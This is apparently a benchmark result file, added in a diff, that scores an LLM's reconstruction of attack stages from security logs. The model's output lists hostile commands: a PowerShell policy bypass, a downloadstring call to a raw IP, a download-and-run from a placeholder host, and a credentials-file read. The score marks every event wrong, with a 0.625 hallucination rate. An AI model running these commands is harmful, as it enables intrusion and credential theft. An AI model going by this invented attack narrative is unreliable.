@@ -1,0 +1,68 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C '.\\\\47\\\\u05B0\\\\u0590\\\\u062D\\\\u065D\\\\u0640\\\\u02DF\\\\u0642\\\\u0600\\\\u061B\\\\u0640\\\\u0627\\\\u065C\\\\u066F\\\\u0635\\\\u0676\\\\u06AB\\\\u0698\\\\u0627\\\\u0627\\\\u0626\\\\u0660\\\\u0686.ps1'",
+        "stage": "Execution"
+      },
+      {
+        "command": "(new-object net.webclient).downloadstring(\"http://124.223.85.207:8082/a\")",
+        "stage": "Collection"
+      },
+      {
+        "command": "webclient.exe downloadfile https://example.com/script.txt c:\\script.txt & start /wait cmd /c c:\\script.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c type C:/Users/Public/credentials.txt",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "An attacker initiated an intrusion via malicious PowerShell script execution ('Execution' phase), downloading additional payloads likely for data collection and establishing command and control communication through web clients. Subsequent commands accessed local files containing credentials, aligning with credential access activities.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 85973,
+      "completion_tokens": 7852,
+      "total_tokens": 93825,
+      "wall_clock_s": 174.835,
+      "parse_retries": 4
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 4,
+      "fn": 23
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 4,
+      "fn": 23,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.625,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 85973,
+      "completion_tokens": 7852,
+      "total_tokens": 93825,
+      "wall_clock_s": 174.835,
+      "parse_retries": 4
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
